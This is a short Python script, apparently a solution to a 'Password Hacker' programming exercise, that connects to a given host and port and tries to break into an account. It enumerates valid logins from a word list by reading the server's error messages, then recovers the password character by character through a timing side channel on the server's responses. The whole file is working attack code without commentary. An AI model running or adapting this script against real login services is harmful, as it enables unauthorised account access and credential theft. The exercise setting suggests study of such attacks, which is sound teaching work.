import argparse
import string
import socket
import json
import time

pass_hacker = argparse.ArgumentParser()
pass_hacker.add_argument("host", type=str)
pass_hacker.add_argument("port", type=int)
args = pass_hacker.parse_args()

my_socket = socket.socket()
address = (args.host, args.port)
my_socket.connect(address)

path = "C:\\Users\\Dasha\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt"
with open(path, "r") as logins_file:
    logins = map(lambda x: x.strip(), logins_file.readlines())
password = ""

for login in logins:
    message_1 = {"login": login, "password": password}
    message_1 = json.dumps(message_1)
    my_socket.send(message_1.encode())
    response = my_socket.recv(1024)
    response_py = json.loads(response.decode())
    if response_py["result"] == "Wrong password!":
        admin = login
        break

password_list = string.ascii_letters + string.digits

flag = True
while flag:
    for letter in password_list:
        message_2 = {"login": admin, "password": password + letter}
        message_2 = json.dumps(message_2)
        my_socket.send(message_2.encode())
        time_start = time.perf_counter()
        response = my_socket.recv(1024)
        time_finish = time.perf_counter()
        response_py = json.loads(response.decode())
        if response_py["result"] == "Wrong password!":
            total_time = time_finish - time_start
            if total_time >= 0.1:
                password += letter
                break
        elif response_py["result"] == "Connection success!":
            print(message_2)
            flag = False
            break

my_socket.close()